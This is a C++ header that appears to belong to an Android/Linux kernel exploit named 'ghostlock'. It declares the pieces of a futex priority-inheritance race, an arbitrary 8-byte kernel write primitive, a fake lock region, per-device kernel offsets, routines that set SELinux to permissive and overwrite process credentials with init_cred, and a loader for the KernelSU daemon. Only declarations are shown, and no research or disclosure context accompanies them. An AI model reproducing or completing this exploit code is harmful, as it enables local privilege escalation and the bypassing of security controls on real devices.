#ifndef GHOSTLOCK_COMMON_H
#define GHOSTLOCK_COMMON_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <atomic>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "layout.h"
#include "offsets.h"
#include "futex_pi.h"

#define GL_FD_DUP_COUNT 260

#define GL_NS_PER_MS 1000000ULL
#define GL_MS_PER_SEC 1000ULL
#define GL_KPROBE_TIMEOUT_MS 3000U
#define GL_ROUTE_WAIT_SEC 8U

#define GL_STAMP_PRIO_NORMAL 130U

#define GL_KWRITE_ATTEMPTS 8

#define GL_WAITER_BLOCK_SEC 2U

#define GL_REQUEUE_SETTLE_US 400000U

struct gl_task_pair {
    uint64_t task;
    uint64_t real_cred;
    uint64_t cred;
    uint64_t init_cred;
};

extern std::atomic<int> g_t1_ready;
extern std::atomic<int> g_route_done;
extern std::atomic<int> g_t1_tid;
extern std::atomic<int> g_route_result;
extern std::atomic<int> g_route_errno;
extern std::atomic<int> g_route_stage;

extern std::atomic<int> g_lock_chain;
extern std::atomic<int> g_lock_target;
extern std::atomic<int> g_lock_fake_a;
extern std::atomic<int> g_lock_owner_done;
extern std::atomic<int> g_chain_released;
extern std::atomic<int> g_owner_blocked;
extern std::atomic<int> g_t1_entered;

extern std::atomic<int> g_rearm_go;
extern std::atomic<int> g_rearm_done;
extern std::atomic<int> g_cycle_fresh;

extern std::atomic<int> g_drain_go;
extern std::atomic<int> g_drain_unlock_done;
extern std::atomic<int> g_drain_done;
extern std::atomic<int> g_drain_ret;

#define GL_DRAIN_WAIT_MS 5000U

int gl_drain_pi_cycle(void);

void gl_drain_or_park(void);

extern uint64_t g_scratch_lo;
extern uint64_t g_fake_lock;
extern uint64_t g_init_area;

extern std::atomic<int> g_w_go;
extern std::atomic<int> g_w_done;
extern uint64_t g_w_target;
extern uint64_t g_w_value;

extern uint64_t g_w_lock;

uint64_t gl_monotonic_ms(void);
int gl_wait_flag(std::atomic<int> *flag, int value, uint64_t timeout_ms);
void gl_yield_spin_flag(std::atomic<int> *flag, int value);

int gl_get_tid(void);
void gl_fdset_arm(void);

#define GL_KSUD_DIR "/data/app/"
#define GL_KSUD_GLOB GL_KSUD_DIR "*/me.weishu.kernelsu-*/lib/arm64/libksud.so"
#define GL_KSUD_FALLBACK "/data/adb/ksud"

#define GL_KSUD_WAIT_MS 30000U

int gl_ksud_late_load(void);

int gl_write8(uint64_t target, uint64_t value);

typedef int (*gl_verify_fn)(void);

int gl_write8_until(uint64_t target, uint64_t value, gl_verify_fn verify);

int gl_cycle_rearm(void);

uint64_t gl_fake_lock_region_offset(void);

void *gl_thread_a(void *arg);
void *gl_thread_b(void *arg);
void *gl_thread_c(void *arg);

int gl_trigger_run(void);

struct gl_runtime_ids;

int gl_selinux_route(const struct gl_offsets *off);
int gl_selinux_permissive(void);
int gl_cred_install(const struct gl_offsets *off,
                    const struct gl_runtime_ids *ids);

const struct gl_offsets *gl_profile(void);

#endif
